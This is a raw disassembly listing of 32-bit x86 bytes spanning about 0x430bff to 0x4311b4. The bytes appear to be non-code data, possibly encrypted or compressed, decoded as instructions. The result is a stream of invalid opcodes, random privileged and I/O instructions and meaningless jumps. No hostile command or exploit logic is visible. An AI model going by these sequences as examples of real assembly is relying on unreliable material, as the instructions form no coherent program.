  430bff:	1d 78 40 5f e2       	sbb    $0xe25f4078,%eax
  430c04:	fc                   	cld
  430c05:	df b7 75 a8 1f 84    	fbstp  -0x7be0578b(%edi)
  430c0b:	82 5c d6 ea 75       	sbbb   $0x75,-0x16(%esi,%edx,8)
  430c10:	64 bb 0d 82 36 f3    	fs mov $0xf336820d,%ebx
  430c16:	c2 9f f2             	ret    $0xf29f
  430c19:	ab                   	stos   %eax,%es:(%edi)
  430c1a:	5e                   	pop    %esi
  430c1b:	12 ce                	adc    %dh,%cl
  430c1d:	72 92                	jb     0x430bb1
  430c1f:	93                   	xchg   %eax,%ebx
  430c20:	ea a6 89 d4 49 ea a1 	ljmp   $0xa1ea,$0x49d489a6
  430c27:	df 16                	fists  (%esi)
  430c29:	3c ca                	cmp    $0xca,%al
  430c2b:	ec                   	in     (%dx),%al
  430c2c:	7b e7                	jnp    0x430c15
  430c2e:	91                   	xchg   %eax,%ecx
  430c2f:	43                   	inc    %ebx
  430c30:	06                   	push   %es
  430c31:	d5 54                	aad    $0x54
  430c33:	36 04 96             	ss add $0x96,%al
  430c36:	cd 59                	int    $0x59
  430c38:	48                   	dec    %eax
  430c39:	e9 d9 f3 98 01       	jmp    0x1dc0017
  430c3e:	25 e2 e2 fd e3       	and    $0xe3fde2e2,%eax
  430c43:	ee                   	out    %al,(%dx)
  430c44:	75 27                	jne    0x430c6d
  430c46:	2d 77 eb f5 cf       	sub    $0xcff5eb77,%eax
  430c4b:	92                   	xchg   %eax,%edx
  430c4c:	fa                   	cli
  430c4d:	89 75 55             	mov    %esi,0x55(%ebp)
  430c50:	d3 1e                	rcrl   %cl,(%esi)
  430c52:	06                   	push   %es
  430c53:	2f                   	das
  430c54:	6a 5b                	push   $0x5b
  430c56:	f4                   	hlt
  430c57:	95                   	xchg   %eax,%ebp
  430c58:	81 60 bf 40 8c 64 19 	andl   $0x19648c40,-0x41(%eax)
  430c5f:	76 b9                	jbe    0x430c1a
  430c61:	fb                   	sti
  430c62:	62 c1 1c 98 9e       	(bad)
  430c67:	04 31                	add    $0x31,%al
  430c69:	2a b5 68 d0 75 45    	sub    0x4575d068(%ebp),%dh
  430c6f:	31 19                	xor    %ebx,(%ecx)
  430c71:	02 78 23             	add    0x23(%eax),%bh
  430c74:	7b b4                	jnp    0x430c2a
  430c76:	70 c6                	jo     0x430c3e
  430c78:	46                   	inc    %esi
  430c79:	c4 2a                	les    (%edx),%ebp
  430c7b:	ba f2 99 07 f6       	mov    $0xf60799f2,%edx
  430c80:	3a 99 7f 7e 4e 85    	cmp    -0x7ab18181(%ecx),%bl
  430c86:	b7 35                	mov    $0x35,%bh
  430c88:	53                   	push   %ebx
  430c89:	e0 7b                	loopne 0x430d06
  430c8b:	ae                   	scas   %es:(%edi),%al
  430c8c:	7a 3b                	jp     0x430cc9
  430c8e:	d6                   	salc
  430c8f:	62 e3 e7 94 3b       	(bad)
  430c94:	e0 58                	loopne 0x430cee
  430c96:	b5 da                	mov    $0xda,%ch
  430c98:	66 d4 ba             	data16 aam $0xba
  430c9b:	59                   	pop    %ecx
  430c9c:	42                   	inc    %edx
  430c9d:	b3 77                	mov    $0x77,%bl
  430c9f:	30 9d a9 7c 82 f3    	xor    %bl,-0xc7d8357(%ebp)
  430ca5:	cc                   	int3
  430ca6:	b0 7a                	mov    $0x7a,%al
  430ca8:	f4                   	hlt
  430ca9:	5d                   	pop    %ebp
  430caa:	bc 6f c8 bb 8c       	mov    $0x8cbbc86f,%esp
  430caf:	dc 3d 1a 45 0b 82    	fdivrl 0x820b451a
  430cb5:	dc ae 53 e9 51 57    	fsubrl 0x5751e953(%esi)
  430cbb:	fb                   	sti
  430cbc:	10 8f 41 28 76 91    	adc    %cl,-0x6e89d7bf(%edi)
  430cc2:	26 6a a1             	es push $0xffffffa1
  430cc5:	81 be 1a 5d 81 9c bc 	cmpl   $0x3b1b9cbc,-0x637ea2e6(%esi)
  430ccc:	9c 1b 3b 
  430ccf:	f8                   	clc
  430cd0:	07                   	pop    %es
  430cd1:	8c 0d 97 a8 4c 80    	mov    %cs,0x804ca897
  430cd7:	59                   	pop    %ecx
  430cd8:	d7                   	xlat   %ds:(%ebx)
  430cd9:	c1 6b 4d d7          	shrl   $0xd7,0x4d(%ebx)
  430cdd:	f6 59 ac             	negb   -0x54(%ecx)
  430ce0:	41                   	inc    %ecx
  430ce1:	1b b3 5d 43 4a 57    	sbb    0x574a435d(%ebx),%esi
  430ce7:	87 f4                	xchg   %esi,%esp
  430ce9:	de 03                	fiadds (%ebx)
  430ceb:	3f                   	aas
  430cec:	d9 fc                	frndint
  430cee:	f2 d0 1f             	repnz rcrb $1,(%edi)
  430cf1:	c8 4c 4c 29          	enter  $0x4c4c,$0x29
  430cf5:	12 ab f4 1a f6 69    	adc    0x69f61af4(%ebx),%ch
  430cfb:	6a 93                	push   $0xffffff93
  430cfd:	f3 65 8b 24 eb       	repz mov %gs:(%ebx,%ebp,8),%esp
  430d02:	c9                   	leave
  430d03:	42                   	inc    %edx
  430d04:	58                   	pop    %eax
  430d05:	b6 68                	mov    $0x68,%dh
  430d07:	c7                   	(bad)
  430d08:	cb                   	lret
  430d09:	48                   	dec    %eax
  430d0a:	c7                   	(bad)
  430d0b:	b3 c7                	mov    $0xc7,%bl
  430d0d:	18 8c 3f d6 4f 6c 2a 	sbb    %cl,0x2a6c4fd6(%edi,%edi,1)
  430d14:	b3 11                	mov    $0x11,%bl
  430d16:	5e                   	pop    %esi
  430d17:	d8 97 58 ca 93 60    	fcoms  0x6093ca58(%edi)
  430d1d:	ac                   	lods   %ds:(%esi),%al
  430d1e:	f6 97 3d ad d6 54    	notb   0x54d6ad3d(%edi)
  430d24:	2a 05 0a 67 7c e7    	sub    0xe77c670a,%al
  430d2a:	79 f4                	jns    0x430d20
  430d2c:	75 41                	jne    0x430d6f
  430d2e:	24 ce                	and    $0xce,%al
  430d30:	b3 3f                	mov    $0x3f,%bl
  430d32:	e2 d7                	loop   0x430d0b
  430d34:	23 4a 32             	and    0x32(%edx),%ecx
  430d37:	72 08                	jb     0x430d41
  430d39:	8a bf 30 f1 9d 62    	mov    0x629df130(%edi),%bh
  430d3f:	52                   	push   %edx
  430d40:	f4                   	hlt
  430d41:	7b 2a                	jnp    0x430d6d
  430d43:	71 ef                	jno    0x430d34
  430d45:	ec                   	in     (%dx),%al
  430d46:	a0 7e a9 a6 62       	mov    0x62a6a97e,%al
  430d4b:	ab                   	stos   %eax,%es:(%edi)
  430d4c:	90                   	nop
  430d4d:	7f 0e                	jg     0x430d5d
  430d4f:	5d                   	pop    %ebp
  430d50:	b1 3f                	mov    $0x3f,%cl
  430d52:	6e                   	outsb  %ds:(%esi),(%dx)
  430d53:	0b 6f 6e             	or     0x6e(%edi),%ebp
  430d56:	ae                   	scas   %es:(%edi),%al
  430d57:	06                   	push   %es
  430d58:	54                   	push   %esp
  430d59:	04 2d                	add    $0x2d,%al
  430d5b:	51                   	push   %ecx
  430d5c:	04 8e                	add    $0x8e,%al
  430d5e:	46                   	inc    %esi
  430d5f:	37                   	aaa
  430d60:	31 0f                	xor    %ecx,(%edi)
  430d62:	3d b9 9c 12 b0       	cmp    $0xb0129cb9,%eax
  430d67:	53                   	push   %ebx
  430d68:	34 3c                	xor    $0x3c,%al
  430d6a:	f0 67 8c 38          	lock mov %?,(%bx,%si)
  430d6e:	ce                   	into
  430d6f:	cc                   	int3
  430d70:	99                   	cltd
  430d71:	f6 70 42             	divb   0x42(%eax)
  430d74:	d7                   	xlat   %ds:(%ebx)
  430d75:	26 dc 0a             	fmull  %es:(%edx)
  430d78:	97                   	xchg   %eax,%edi
  430d79:	c3                   	ret
  430d7a:	ef                   	out    %eax,(%dx)
  430d7b:	c5 31                	lds    (%ecx),%esi
  430d7d:	2d 6c 32 d3 1d       	sub    $0x1dd3326c,%eax
  430d82:	d3 19                	rcrl   %cl,(%ecx)
  430d84:	96                   	xchg   %eax,%esi
  430d85:	74 96                	je     0x430d1d
  430d87:	8d a3 33 e2 76 9b    	lea    -0x64891dcd(%ebx),%esp
  430d8d:	0b 87 29 39 5d 6d    	or     0x6d5d3929(%edi),%eax
  430d93:	73 a4                	jae    0x430d39
  430d95:	b5 05                	mov    $0x5,%ch
  430d97:	ff 9b 84 46 dd 2f    	lcall  *0x2fdd4684(%ebx)
  430d9d:	4c                   	dec    %esp
  430d9e:	d2 cd                	ror    %cl,%ch
  430da0:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  430da1:	05 9b 3e 13 28       	add    $0x28133e9b,%eax
  430da6:	1a ad eb 08 fa ac    	sbb    -0x5305f715(%ebp),%ch
  430dac:	e1 cf                	loope  0x430d7d
  430dae:	3d fe 3c 6d 60       	cmp    $0x606d3cfe,%eax
  430db3:	c0 91 d7 63 76 cc 58 	rclb   $0x58,-0x33899c29(%ecx)
  430dba:	29 e8                	sub    %ebp,%eax
  430dbc:	94                   	xchg   %eax,%esp
  430dbd:	0d a2 83 a9 e7       	or     $0xe7a983a2,%eax
  430dc2:	b3 b5                	mov    $0xb5,%bl
  430dc4:	69 0a d9 ad 06 d4    	imul   $0xd406add9,(%edx),%ecx
  430dca:	fc                   	cld
  430dcb:	b5 04                	mov    $0x4,%ch
  430dcd:	fe                   	(bad)
  430dce:	e7 c7                	out    %eax,$0xc7
  430dd0:	45                   	inc    %ebp
  430dd1:	7d 93                	jge    0x430d66
  430dd3:	b2 98                	mov    $0x98,%dl
  430dd5:	50                   	push   %eax
  430dd6:	bb 2b 6c a4 0b       	mov    $0xba46c2b,%ebx
  430ddb:	60                   	pusha
  430ddc:	e1 72                	loope  0x430e50
  430dde:	cf                   	iret
  430ddf:	f1                   	int1
  430de0:	57                   	push   %edi
  430de1:	3a 60 dc             	cmp    -0x24(%eax),%ah
  430de4:	95                   	xchg   %eax,%ebp
  430de5:	80 de 57             	sbb    $0x57,%dh
  430de8:	55                   	push   %ebp
  430de9:	8c 60 39             	mov    %fs,0x39(%eax)
  430dec:	e5 8f                	in     $0x8f,%eax
  430dee:	df ab ed 4c d7 8a    	fildll -0x7528b313(%ebx)
  430df4:	d5 17                	aad    $0x17
  430df6:	e7 72                	out    %eax,$0x72
  430df8:	d3 6b f8             	shrl   %cl,-0x8(%ebx)
  430dfb:	51                   	push   %ecx
  430dfc:	f0 93                	lock xchg %eax,%ebx
  430dfe:	e7 2a                	out    %eax,$0x2a
  430e00:	8e 48 6d             	mov    0x6d(%eax),%cs
  430e03:	1b c1                	sbb    %ecx,%eax
  430e05:	2a 6c 0d 5e          	sub    0x5e(%ebp,%ecx,1),%ch
  430e09:	90                   	nop
  430e0a:	05 bc 79 5d 96       	add    $0x965d79bc,%eax
  430e0f:	b6 45                	mov    $0x45,%dh
  430e11:	e4 a3                	in     $0xa3,%al
  430e13:	cc                   	int3
  430e14:	e3 c5                	jecxz  0x430ddb
  430e16:	0f 61 6b 32          	punpcklwd 0x32(%ebx),%mm5
  430e1a:	31 69 20             	xor    %ebp,0x20(%ecx)
  430e1d:	e0 72                	loopne 0x430e91
  430e1f:	25 29 28 b9 ec       	and    $0xecb92829,%eax
  430e24:	7b 18                	jnp    0x430e3e
  430e26:	bc 88 d7 22 c8       	mov    $0xc822d788,%esp
  430e2b:	d6                   	salc
  430e2c:	36 dc 90 6b 35 ac f1 	fcoml  %ss:-0xe53ca95(%eax)
  430e33:	81 e4 60 81 77 51    	and    $0x51778160,%esp
  430e39:	a9 60 00 c8 ca       	test   $0xcac80060,%eax
  430e3e:	17                   	pop    %ss
  430e3f:	b2 27                	mov    $0x27,%dl
  430e41:	ac                   	lods   %ds:(%esi),%al
  430e42:	30 08                	xor    %cl,(%eax)
  430e44:	55                   	push   %ebp
  430e45:	cf                   	iret
  430e46:	42                   	inc    %edx
  430e47:	a0 34 06 42 43       	mov    0x43420634,%al
  430e4c:	fa                   	cli
  430e4d:	50                   	push   %eax
  430e4e:	5b                   	pop    %ebx
  430e4f:	74 63                	je     0x430eb4
  430e51:	0d 5e cd 16 45       	or     $0x4516cd5e,%eax
  430e56:	25 1a b1 4a 96       	and    $0x964ab11a,%eax
  430e5b:	18 aa dd dc ba c8    	sbb    %ch,-0x37452323(%edx)
  430e61:	f8                   	clc
  430e62:	c9                   	leave
  430e63:	30 90 ee 19 7a 0f    	xor    %dl,0xf7a19ee(%eax)
  430e69:	97                   	xchg   %eax,%edi
  430e6a:	d3 33                	shll   %cl,(%ebx)
  430e6c:	ac                   	lods   %ds:(%esi),%al
  430e6d:	23 fb                	and    %ebx,%edi
  430e6f:	94                   	xchg   %eax,%esp
  430e70:	5c                   	pop    %esp
  430e71:	74 46                	je     0x430eb9
  430e73:	d3 ee                	shr    %cl,%esi
  430e75:	27                   	daa
  430e76:	7d dc                	jge    0x430e54
  430e78:	1a 57 ea             	sbb    -0x16(%edi),%dl
  430e7b:	c5 e9 21             	(bad)
  430e7e:	38 dc                	cmp    %bl,%ah
  430e80:	a2 d3 91 a4 1c       	mov    %al,0x1ca491d3
  430e85:	fc                   	cld
  430e86:	b0 75                	mov    $0x75,%al
  430e88:	37                   	aaa
  430e89:	66 45                	inc    %bp
  430e8b:	a3 13 e0 e2 52       	mov    %eax,0x52e2e013
  430e90:	fc                   	cld
  430e91:	c9                   	leave
  430e92:	cf                   	iret
  430e93:	d8 ae 2f c7 a4 a7    	fsubrs -0x585b38d1(%esi)
  430e99:	00 f2                	add    %dh,%dl
  430e9b:	d4 fd                	aam    $0xfd
  430e9d:	e4 01                	in     $0x1,%al
  430e9f:	9b                   	fwait
  430ea0:	cc                   	int3
  430ea1:	40                   	inc    %eax
  430ea2:	e7 98                	out    %eax,$0x98
  430ea4:	3a a7 55 14 4f 33    	cmp    0x334f1455(%edi),%ah
  430eaa:	b4 f0                	mov    $0xf0,%ah
  430eac:	e8 c4 09 ba 7d       	call   0x7dfd1875
  430eb1:	c8 dd bc e8          	enter  $0xbcdd,$0xe8
  430eb5:	b7 03                	mov    $0x3,%bh
  430eb7:	0d 78 1b ce ef       	or     $0xefce1b78,%eax
  430ebc:	42                   	inc    %edx
  430ebd:	70 af                	jo     0x430e6e
  430ebf:	d1 c1                	rol    $1,%ecx
  430ec1:	24 0a                	and    $0xa,%al
  430ec3:	26 86 5f d0          	xchg   %bl,%es:-0x30(%edi)
  430ec7:	84 b9 89 d6 0e 7d    	test   %bh,0x7d0ed689(%ecx)
  430ecd:	09 f3                	or     %esi,%ebx
  430ecf:	64 86 fa             	fs xchg %bh,%dl
  430ed2:	53                   	push   %ebx
  430ed3:	27                   	daa
  430ed4:	06                   	push   %es
  430ed5:	6b 43 89 0c          	imul   $0xc,-0x77(%ebx),%eax
  430ed9:	c9                   	leave
  430eda:	4c                   	dec    %esp
  430edb:	8a 2b                	mov    (%ebx),%ch
  430edd:	18 5b 46             	sbb    %bl,0x46(%ebx)
  430ee0:	fe                   	(bad)
  430ee1:	38 f1                	cmp    %dh,%cl
  430ee3:	79 d9                	jns    0x430ebe
  430ee5:	b8 1c 4d 7d 34       	mov    $0x347d4d1c,%eax
  430eea:	b9 7a f1 c5 4a       	mov    $0x4ac5f17a,%ecx
  430eef:	ae                   	scas   %es:(%edi),%al
  430ef0:	fe                   	(bad)
  430ef1:	f2 98                	repnz cwtl
  430ef3:	69 c3 72 8e b0 aa    	imul   $0xaab08e72,%ebx,%eax
  430ef9:	f6 40 29 db          	testb  $0xdb,0x29(%eax)
  430efd:	d5 99                	aad    $0x99
  430eff:	b5 ec                	mov    $0xec,%ch
  430f01:	ff c6                	inc    %esi
  430f03:	31 65 a8             	xor    %esp,-0x58(%ebp)
  430f06:	4f                   	dec    %edi
  430f07:	59                   	pop    %ecx
  430f08:	c1 ca 9a             	ror    $0x9a,%edx
  430f0b:	58                   	pop    %eax
  430f0c:	51                   	push   %ecx
  430f0d:	bc ea e6 2e c9       	mov    $0xc92ee6ea,%esp
  430f12:	73 19                	jae    0x430f2d
  430f14:	7d f3                	jge    0x430f09
  430f16:	85 5a c8             	test   %ebx,-0x38(%edx)
  430f19:	24 f3                	and    $0xf3,%al
  430f1b:	d3 9a df 44 a6 fe    	rcrl   %cl,-0x159bb21(%edx)
  430f21:	96                   	xchg   %eax,%esi
  430f22:	67 1e                	addr16 push %ds
  430f24:	71 e9                	jno    0x430f0f
  430f26:	5e                   	pop    %esi
  430f27:	02 10                	add    (%eax),%dl
  430f29:	e2 3d                	loop   0x430f68
  430f2b:	7f 60                	jg     0x430f8d
  430f2d:	4a                   	dec    %edx
  430f2e:	aa                   	stos   %al,%es:(%edi)
  430f2f:	b2 07                	mov    $0x7,%dl
  430f31:	e0 a7                	loopne 0x430eda
  430f33:	73 0c                	jae    0x430f41
  430f35:	14 39                	adc    $0x39,%al
  430f37:	c0 40 00 24          	rolb   $0x24,0x0(%eax)
  430f3b:	c0 38 88             	sarb   $0x88,(%eax)
  430f3e:	28 9d f7 7e 1a a5    	sub    %bl,-0x5ae58109(%ebp)
  430f44:	63 41 60             	arpl   %eax,0x60(%ecx)
  430f47:	c7                   	(bad)
  430f48:	f5                   	cmc
  430f49:	fe                   	(bad)
  430f4a:	95                   	xchg   %eax,%ebp
  430f4b:	4a                   	dec    %edx
  430f4c:	5e                   	pop    %esi
  430f4d:	05 25 75 44 3e       	add    $0x3e447525,%eax
  430f52:	9a 8d 0e 7b 04 1d 7a 	lcall  $0x7a1d,$0x47b0e8d
  430f59:	74 ee                	je     0x430f49
  430f5b:	39 c4                	cmp    %eax,%esp
  430f5d:	3e 6a 10             	ds push $0x10
  430f60:	5d                   	pop    %ebp
  430f61:	a1 67 e8 ca 26       	mov    0x26cae867,%eax
  430f66:	3e 9b                	ds fwait
  430f68:	3e 8e 58 8e          	mov    %ds:-0x72(%eax),%ds
  430f6c:	42                   	inc    %edx
  430f6d:	2d 1c 90 75 2e       	sub    $0x2e75901c,%eax
  430f72:	f0 6b 4d d3 1e       	lock imul $0x1e,-0x2d(%ebp),%ecx
  430f77:	1e                   	push   %ds
  430f78:	9b                   	fwait
  430f79:	1c a2                	sbb    $0xa2,%al
  430f7b:	64 c6                	fs (bad)
  430f7d:	ec                   	in     (%dx),%al
  430f7e:	f8                   	clc
  430f7f:	59                   	pop    %ecx
  430f80:	c2 04 5f             	ret    $0x5f04
  430f83:	cc                   	int3
  430f84:	87 ae cd a3 b0 35    	xchg   %ebp,0x35b0a3cd(%esi)
  430f8a:	9e                   	sahf
  430f8b:	79 59                	jns    0x430fe6
  430f8d:	7b 31                	jnp    0x430fc0
  430f8f:	3c 87                	cmp    $0x87,%al
  430f91:	53                   	push   %ebx
  430f92:	04 92                	add    $0x92,%al
  430f94:	19 a5 ab 8f e7 12    	sbb    %esp,0x12e78fab(%ebp)
  430f9a:	56                   	push   %esi
  430f9b:	5a                   	pop    %edx
  430f9c:	b2 f0                	mov    $0xf0,%dl
  430f9e:	31 f0                	xor    %esi,%eax
  430fa0:	d6                   	salc
  430fa1:	ba d3 41 b2 24       	mov    $0x24b241d3,%edx
  430fa6:	13 f9                	adc    %ecx,%edi
  430fa8:	17                   	pop    %ss
  430fa9:	61                   	popa
  430faa:	93                   	xchg   %eax,%ebx
  430fab:	49                   	dec    %ecx
  430fac:	b4 d3                	mov    $0xd3,%ah
  430fae:	f3 59                	repz pop %ecx
  430fb0:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  430fb1:	5e                   	pop    %esi
  430fb2:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  430fb3:	3b 89 a9 2a 11 b2    	cmp    -0x4deed557(%ecx),%ecx
  430fb9:	1f                   	pop    %ds
  430fba:	1f                   	pop    %ds
  430fbb:	cb                   	lret
  430fbc:	e9 5b 68 4c b8       	jmp    0xb88f781c
  430fc1:	15 21 13 b0 52       	adc    $0x52b01321,%eax
  430fc6:	06                   	push   %es
  430fc7:	af                   	scas   %es:(%edi),%eax
  430fc8:	96                   	xchg   %eax,%esi
  430fc9:	5e                   	pop    %esi
  430fca:	2b 02                	sub    (%edx),%eax
  430fcc:	24 76                	and    $0x76,%al
  430fce:	8b a3 c3 5a 6f 23    	mov    0x236f5ac3(%ebx),%esp
  430fd4:	5a                   	pop    %edx
  430fd5:	08 a0 4b 95 1d e4    	or     %ah,-0x1be26ab5(%eax)
  430fdb:	7c 67                	jl     0x431044
  430fdd:	56                   	push   %esi
  430fde:	67 c8 2a e1 d8       	addr16 enter $0xe12a,$0xd8
  430fe3:	aa                   	stos   %al,%es:(%edi)
  430fe4:	28 39                	sub    %bh,(%ecx)
  430fe6:	f4                   	hlt
  430fe7:	ae                   	scas   %es:(%edi),%al
  430fe8:	65 7b 88             	gs jnp 0x430f73
  430feb:	08 1a                	or     %bl,(%edx)
  430fed:	ee                   	out    %al,(%dx)
  430fee:	d0 10                	rclb   $1,(%eax)
  430ff0:	8c d9                	mov    %ds,%ecx
  430ff2:	46                   	inc    %esi
  430ff3:	81 68 f2 01 9e 9d 50 	subl   $0x509d9e01,-0xe(%eax)
  430ffa:	2e 5a                	cs pop %edx
  430ffc:	8c b0 92 72 81 2e    	mov    %?,0x2e817292(%eax)
  431002:	73 e1                	jae    0x430fe5
  431004:	74 f7                	je     0x430ffd
  431006:	27                   	daa
  431007:	b9 53 21 dc 47       	mov    $0x47dc2153,%ecx
  43100c:	7a 12                	jp     0x431020
  43100e:	f7 7c 7c 3e          	idivl  0x3e(%esp,%edi,2)
  431012:	31 3b                	xor    %edi,(%ebx)
  431014:	8a 3e                	mov    (%esi),%bh
  431016:	d2 e3                	shl    %cl,%bl
  431018:	c7 02 6f 9d 7d e7    	movl   $0xe77d9d6f,(%edx)
  43101e:	51                   	push   %ecx
  43101f:	37                   	aaa
  431020:	aa                   	stos   %al,%es:(%edi)
  431021:	5e                   	pop    %esi
  431022:	b9 fe 2e 25 fd       	mov    $0xfd252efe,%ecx
  431027:	d6                   	salc
  431028:	2a 2b                	sub    (%ebx),%ch
  43102a:	c0 f3 0e             	shl    $0xe,%bl
  43102d:	bf b7 0e 6b 12       	mov    $0x126b0eb7,%edi
  431032:	a3 fc 32 c2 1f       	mov    %eax,0x1fc232fc
  431037:	7e 78                	jle    0x4310b1
  431039:	8c 73 fa             	mov    %?,-0x6(%ebx)
  43103c:	3c a6                	cmp    $0xa6,%al
  43103e:	55                   	push   %ebp
  43103f:	ee                   	out    %al,(%dx)
  431040:	7c c3                	jl     0x431005
  431042:	82 bb 83 be a3 44 a5 	cmpb   $0xa5,0x44a3be83(%ebx)
  431049:	df 53 d3             	fists  -0x2d(%ebx)
  43104c:	16                   	push   %ss
  43104d:	ba 6c 8e 2e 2c       	mov    $0x2c2e8e6c,%edx
  431052:	6f                   	outsl  %ds:(%esi),(%dx)
  431053:	76 3a                	jbe    0x43108f
  431055:	b0 d9                	mov    $0xd9,%al
  431057:	e9 7d 22 ea df       	jmp    0xe02d32d9
  43105c:	86 61 d8             	xchg   %ah,-0x28(%ecx)
  43105f:	ff 05 70 ef 96 98    	incl   0x9896ef70
  431065:	af                   	scas   %es:(%edi),%eax
  431066:	bb 44 26 03 6e       	mov    $0x6e032644,%ebx
  43106b:	90                   	nop
  43106c:	5a                   	pop    %edx
  43106d:	76 e9                	jbe    0x431058
  43106f:	e8 c6 5b 9e 4b       	call   0x4be16c3a
  431074:	d9 63 be             	fldenv -0x42(%ebx)
  431077:	0a c2                	or     %dl,%al
  431079:	8f                   	(bad)
  43107a:	5e                   	pop    %esi
  43107b:	6f                   	outsl  %ds:(%esi),(%dx)
  43107c:	9b                   	fwait
  43107d:	03 98 9c c7 b8 dd    	add    -0x22473864(%eax),%ebx
  431083:	09 7b 86             	or     %edi,-0x7a(%ebx)
  431086:	e8 33 08 a4 cd       	call   0xcde718be
  43108b:	a0 fa f1 a0 8f       	mov    0x8fa0f1fa,%al
  431090:	2b 64 52 c2          	sub    -0x3e(%edx,%edx,2),%esp
  431094:	fd                   	std
  431095:	d5 d7                	aad    $0xd7
  431097:	5a                   	pop    %edx
  431098:	62                   	(bad)
  431099:	f4                   	hlt
  43109a:	97                   	xchg   %eax,%edi
  43109b:	b6 82                	mov    $0x82,%dh
  43109d:	55                   	push   %ebp
  43109e:	d6                   	salc
  43109f:	e6 0c                	out    %al,$0xc
  4310a1:	08 5f 44             	or     %bl,0x44(%edi)
  4310a4:	5f                   	pop    %edi
  4310a5:	43                   	inc    %ebx
  4310a6:	48                   	dec    %eax
  4310a7:	89 ef                	mov    %ebp,%edi
  4310a9:	5a                   	pop    %edx
  4310aa:	83 60 f5 e3          	andl   $0xffffffe3,-0xb(%eax)
  4310ae:	16                   	push   %ss
  4310af:	5d                   	pop    %ebp
  4310b0:	09 92 2c e2 61 98    	or     %edx,-0x679e1dd4(%edx)
  4310b6:	19 ca                	sbb    %ecx,%edx
  4310b8:	3d 01 cc c2 75       	cmp    $0x75c2cc01,%eax
  4310bd:	8e fe                	mov    %esi,%?
  4310bf:	8e 42 94             	mov    -0x6c(%edx),%es
  4310c2:	58                   	pop    %eax
  4310c3:	05 f9 7d 39 97       	add    $0x97397df9,%eax
  4310c8:	1d 35 13 b6 8d       	sbb    $0x8db61335,%eax
  4310cd:	4c                   	dec    %esp
  4310ce:	00 3f                	add    %bh,(%edi)
  4310d0:	30 d7                	xor    %dl,%bh
  4310d2:	79 7d                	jns    0x431151
  4310d4:	d2 b3 b0 ef a3 88    	shlb   %cl,-0x775c1050(%ebx)
  4310da:	13 0c 9f             	adc    (%edi,%ebx,4),%ecx
  4310dd:	52                   	push   %edx
  4310de:	e0 08                	loopne 0x4310e8
  4310e0:	c6                   	(bad)
  4310e1:	27                   	daa
  4310e2:	54                   	push   %esp
  4310e3:	ac                   	lods   %ds:(%esi),%al
  4310e4:	9b df 79 94          	fistpll -0x6c(%ecx)
  4310e8:	d6                   	salc
  4310e9:	4f                   	dec    %edi
  4310ea:	40                   	inc    %eax
  4310eb:	6e                   	outsb  %ds:(%esi),(%dx)
  4310ec:	f6 98 17 d8 8a e7    	negb   -0x187527e9(%eax)
  4310f2:	22 56 c5             	and    -0x3b(%esi),%dl
  4310f5:	7d 27                	jge    0x43111e
  4310f7:	bb 82 e4 e9 7c       	mov    $0x7ce9e482,%ebx
  4310fc:	ec                   	in     (%dx),%al
  4310fd:	aa                   	stos   %al,%es:(%edi)
  4310fe:	a2 98 ae 03 ef       	mov    %al,0xef03ae98
  431103:	2e 44                	cs inc %esp
  431105:	d9 0e                	(bad) (%esi)
  431107:	fe                   	(bad)
  431108:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  431109:	6f                   	outsl  %ds:(%esi),(%dx)
  43110a:	64 62 68 4c          	bound  %ebp,%fs:0x4c(%eax)
  43110e:	d8 93 04 b9 bb 09    	fcoms  0x9bbb904(%ebx)
  431114:	b0 88                	mov    $0x88,%al
  431116:	ce                   	into
  431117:	12 4f 8c             	adc    -0x74(%edi),%cl
  43111a:	a1 ab 9e 44 c1       	mov    0xc1449eab,%eax
  43111f:	c9                   	leave
  431120:	f2 7b 49             	bnd jnp 0x43116c
  431123:	6c                   	insb   (%dx),%es:(%edi)
  431124:	76 1a                	jbe    0x431140
  431126:	14 2e                	adc    $0x2e,%al
  431128:	29 9a 7a bc 78 1c    	sub    %ebx,0x1c78bc7a(%edx)
  43112e:	23 55 92             	and    -0x6e(%ebp),%edx
  431131:	24 81                	and    $0x81,%al
  431133:	59                   	pop    %ecx
  431134:	a9 a3 6d 33 75       	test   $0x75336da3,%eax
  431139:	14 73                	adc    $0x73,%al
  43113b:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  43113c:	ce                   	into
  43113d:	18 e3                	sbb    %ah,%bl
  43113f:	05 a2 5a 70 d0       	add    $0xd0705aa2,%eax
  431144:	3c 11                	cmp    $0x11,%al
  431146:	71 03                	jno    0x43114b
  431148:	e0 7e                	loopne 0x4311c8
  43114a:	38 d2                	cmp    %dl,%dl
  43114c:	5d                   	pop    %ebp
  43114d:	95                   	xchg   %eax,%ebp
  43114e:	2d 38 1d 38 0a       	sub    $0xa381d38,%eax
  431153:	4d                   	dec    %ebp
  431154:	2f                   	das
  431155:	9a ea 75 e6 18 a1 0f 	lcall  $0xfa1,$0x18e675ea
  43115c:	06                   	push   %es
  43115d:	51                   	push   %ecx
  43115e:	c3                   	ret
  43115f:	28 28                	sub    %ch,(%eax)
  431161:	08 d0                	or     %dl,%al
  431163:	0b 31                	or     (%ecx),%esi
  431165:	f9                   	stc
  431166:	85 63 42             	test   %esp,0x42(%ebx)
  431169:	7c 9d                	jl     0x431108
  43116b:	9a af cf 02 6b 97 62 	lcall  $0x6297,$0x6b02cfaf
  431172:	4b                   	dec    %ebx
  431173:	05 fc f1 74 f6       	add    $0xf674f1fc,%eax
  431178:	0d 2b ea 2a 94       	or     $0x942aea2b,%eax
  43117d:	fb                   	sti
  43117e:	9d                   	popf
  43117f:	19 82 ed 33 02 e9    	sbb    %eax,-0x16fdcc13(%edx)
  431185:	bd 03 17 40 38       	mov    $0x38401703,%ebp
  43118a:	cb                   	lret
  43118b:	a2 ed 87 9a 63       	mov    %al,0x639a87ed
  431190:	eb ba                	jmp    0x43114c
  431192:	25 5d 0f 02 68       	and    $0x68020f5d,%eax
  431197:	f2 81 0c 5c 45 71 88 	repnz orl $0xc7887145,(%esp,%ebx,2)
  43119e:	c7 
  43119f:	26 74 85             	es je  0x431127
  4311a2:	9b                   	fwait
  4311a3:	46                   	inc    %esi
  4311a4:	fa                   	cli
  4311a5:	f6 21                	mulb   (%ecx)
  4311a7:	49                   	dec    %ecx
  4311a8:	db 45 48             	fildl  0x48(%ebp)
  4311ab:	e0 20                	loopne 0x4311cd
  4311ad:	b9 3c 88 ca 44       	mov    $0x44ca883c,%ecx
  4311b2:	29 fa                	sub    %edi,%edx
  4311b4:	0e                   	push   %cs
